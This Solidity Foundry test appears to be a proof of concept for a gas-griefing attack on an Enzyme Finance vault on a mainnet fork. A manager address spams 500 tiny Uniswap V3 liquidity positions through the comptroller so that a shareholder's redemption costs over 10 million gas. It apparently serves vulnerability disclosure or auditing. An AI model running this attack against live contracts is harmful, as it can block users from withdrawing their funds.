// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.16;

import { Test, console } from "@forge-std/Test.sol";
import { Math } from "src/utils/Math.sol";

interface IEnzyme {
    function callOnExtension(address _extension, uint256 _actionId, bytes memory _callArgs) external;

    function redeemSharesForSpecificAssets(
        address _recipient,
        uint256 _sharesQuantity,
        address[] memory _payoutAssets,
        uint256[] memory _payoutAssetPercentages
    ) external;
}

contract EnzymeTest is Test {
    // Address of the vault manager.
    address private manager = 0xbb57f06E8c7dBc253b06e3d4B4Bd89eB677Ab7c5;

    // Address of the Enzyme Vault.
    address private vault = 0x23d3285bfE4Fd42965A821f3aECf084F5Bd40Ef4;

    // Address of the Enzyme Comptroller.
    IEnzyme private comptroller = IEnzyme(0xedc41646ad8585a2937F9D17A8c504bE1EEC4e9e);

    // Address of a person that has shares to redeem.
    address private shareRedeemer = 0x6f809A9b799697b4fDD656c29deAC20ed55D330b;

    // Mainnet ERC20 tokens.
    address private WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;

    function setUp() external {}

    function testMaliciousManagerGasGrief() external {
        if (block.number < 16685888) {
            console.log("INVALID BLOCK NUMBER: Use 16685889.");
            return;
        }
        // This bytes data will mint a very small Uniswap V3 YFI/WETH LP position.
        bytes
            memory dataToAddSmallAmountOfLiquidity = hex"0000000000000000000000001601acd913178a0f9eaa202ded0cadda3121b79b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000bc529c00c6401aef6d220be8c6ea1667f6ad93e000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000bb80000000000000000000000000000000000000000000000000000000000003624000000000000000000000000000000000000000000000000000000000000610800000000000000000000000000000000000000000000000000038d7ea4c6800000000000000000000000000000000000000000000000000000038d7ea4c6800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

        // Mimic manager spamming comtroller with small liquidity LP positions.
        // note that gas usage does not increase from the manager doing this, it stays relativelt constant ~390k.
        vm.startPrank(manager);
        for (uint256 i; i < 500; ++i) {
            comptroller.callOnExtension(0x1e3dA40f999Cf47091F869EbAc477d84b0827Cf4, 1, dataToAddSmallAmountOfLiquidity);
        }
        vm.stopPrank();

        // Have user redeem some shares, and confirm gas usage is larger.
        address[] memory payoutAssets = new address[](1);
        payoutAssets[0] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        uint256[] memory payoutPer = new uint256[](1);
        payoutPer[0] = 10000;
        deal(vault, shareRedeemer, 1e18);
        vm.startPrank(shareRedeemer);
        uint256 gas = gasleft();
        comptroller.redeemSharesForSpecificAssets(
            0x6f809A9b799697b4fDD656c29deAC20ed55D330b,
            1e18,
            payoutAssets,
            payoutPer
        );

        assertGt(gas - gasleft(), 10_000_000, "Gas cost should be massive for user withdraw.");
        vm.stopPrank();
    }
}
